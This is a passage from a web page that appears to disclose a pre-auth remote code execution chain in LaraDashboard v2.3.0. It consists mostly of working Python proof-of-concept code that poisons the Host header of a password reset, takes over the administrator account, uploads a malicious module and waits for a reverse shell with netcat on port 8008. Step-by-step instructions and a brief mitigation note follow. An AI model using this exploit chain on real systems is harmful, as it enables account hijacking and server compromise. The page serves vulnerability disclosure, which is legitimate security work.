    <span class="n">token</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="nf">get_token</span><span class="p">(</span><span class="sh">"</span><span class="s">/admin/login</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>
    <span class="n">body</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">_token</span><span class="sh">"</span><span class="p">:</span><span class="n">token</span><span class="p">,</span> <span class="sh">"</span><span class="s">email</span><span class="sh">"</span><span class="p">:</span><span class="n">email</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span><span class="n">password</span><span class="p">,</span> <span class="sh">"</span><span class="s">remember</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">on</span><span class="sh">"</span><span class="p">}</span>
    <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/admin/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">body</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/admin/roles</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">session</span>

<span class="k">def</span> <span class="nf">upload_module</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/admin</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">soup</span> <span class="o">=</span> <span class="nc">BeautifulSoup</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="sh">"</span><span class="s">html.parser</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">"</span><span class="s">name</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">_token</span><span class="sh">"</span><span class="p">})[</span><span class="sh">"</span><span class="s">value</span><span class="sh">"</span><span class="p">]</span>
    <span class="n">cookies</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get_dict</span><span class="p">()</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">_token</span><span class="sh">"</span><span class="p">:</span><span class="n">token</span><span class="p">}</span>

    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">module</span><span class="sh">"</span><span class="p">:</span> <span class="p">(</span>
            <span class="sh">"</span><span class="s">crm.zip</span><span class="sh">"</span><span class="p">,</span>            
            <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">./crm.zip</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">),</span>        
            <span class="sh">"</span><span class="s">application/x-zip-compressed</span><span class="sh">"</span>   
        <span class="p">)</span>
    <span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/admin/modules/upload</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">).</span><span class="n">text</span>

<span class="k">def</span> <span class="nf">account_takeover</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">email</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Step-1 : Account Takevoer</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] reset token : </span><span class="si">{</span><span class="n">uid</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Request to change admin</span><span class="sh">'</span><span class="s">s password ...</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">new_password</span> <span class="o">=</span> <span class="nf">generate_password</span><span class="p">()</span>
    <span class="nf">change_password</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">new_password</span><span class="p">)</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Admin</span><span class="sh">'</span><span class="s">s password change completed</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[-] Email : </span><span class="si">{</span><span class="n">email</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[-] Password : </span><span class="si">{</span><span class="n">new_password</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">new_password</span>

<span class="k">def</span> <span class="nf">request_nc</span><span class="p">():</span>
    <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">http://</span><span class="si">{</span><span class="n">flask_host</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">flask_port</span><span class="si">}</span><span class="s">/nc</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">pause</span><span class="p">():</span>
    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">curl http://</span><span class="si">{</span><span class="n">flask_host</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">flask_port</span><span class="si">}</span><span class="s">/update-state</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">run_both</span><span class="p">():</span>
    <span class="n">t1</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">request_nc</span><span class="p">)</span>
    <span class="n">t1</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">delayed_shell</span><span class="p">():</span>
        <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="nf">pause</span><span class="p">()</span>

    <span class="n">t2</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">delayed_shell</span><span class="p">)</span>
    <span class="n">t2</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/state</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">state</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">connection</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/update-state</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">update_state</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">connection</span>
    <span class="n">connection</span> <span class="o">=</span> <span class="sh">"</span><span class="s">True</span><span class="sh">"</span>
    <span class="k">return</span> <span class="n">connection</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/nc</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">nc</span><span class="p">():</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Waiting for the shell...</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">nc -lv 8008</span><span class="sh">"</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/admin/password/reset/&lt;uid&gt;</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">reset</span><span class="p">(</span><span class="n">uid</span><span class="p">):</span>
    <span class="n">email</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">email</span><span class="sh">"</span><span class="p">)</span> 

    <span class="n">password</span> <span class="o">=</span> <span class="nf">account_takeover</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">email</span><span class="p">)</span>
    <span class="n">session</span> <span class="o">=</span> <span class="nf">login</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
    <span class="nf">upload_module</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>
    <span class="nf">run_both</span><span class="p">()</span>

    <span class="k">return</span> <span class="sh">"""</span><span class="s">
    &lt;script&gt;window.onload = function () {window.open(</span><span class="sh">''</span><span class="s">, </span><span class="sh">'</span><span class="s">_self</span><span class="sh">'</span><span class="s">); window.close();}&lt;/script&gt;
    </span><span class="sh">"""</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">send_pin</span><span class="p">()</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="n">flask_port</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="n">flask_host</span><span class="p">)</span>
</code></pre></div></div><p>the full poc code is shown above.</p><ol><li>request a password reset token for the administrator’s email address.<ol><li>when requesting the reset token, modify the value of the host header to point to the attacker’s flask server. (this ensures that when the administrator clicks the reset link, the reset token is sent to the attacker’s server.)</ol><li>after obtaining the token and logging in as the administrator using the new password, upload the crm.zip file to install the malicious module.<li>use netcat to open port 8008 and wait for the reverse shell.<ol><li>once the shell is received, execute commands to verify code execution.</ol></ol><style> .video-wrap { position: relative; width: 100%; max-width: 880px; overflow: hidden; border-radius: 12px; } .video-wrap iframe { width: 100%; height: 100%; aspect-ratio: 16 / 9; border: 0; }</style><div class="video-wrap"> <iframe src="https://www.youtube.com/embed/4M1Esp9242w" title="1-Click Pre-Auth RCE in LaraDashboard@v2.3.0" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""> </iframe></div><p>this video is set to “unlisted,” and only users with the link can view it.</p><h1 id="recommended-mitigation"> <a href="#recommended-mitigation" class="anchor-heading" aria-labelledby="recommended-mitigation"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Recommended Mitigation</h1><p>the account takeover vulnerability, which allows abuse of the administrator account, should be patched. before issuing a reset token, the application must verify that the generated url matches the legitimate cms domain.</p></main><hr><footer><p><a href="#top" id="back-to-top">Back to top</a></p><p class="text-small text-grey-dk-100 mb-0"></p><div class="d-flex mt-2"></div></footer></div></div><div class="search-overlay"></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@9.1.6/dist/mermaid.min.js"></script> <script> var config = {} ; mermaid.initialize(config); window.mermaid.init(undefined, document.querySelectorAll('.language-mermaid')); </script>
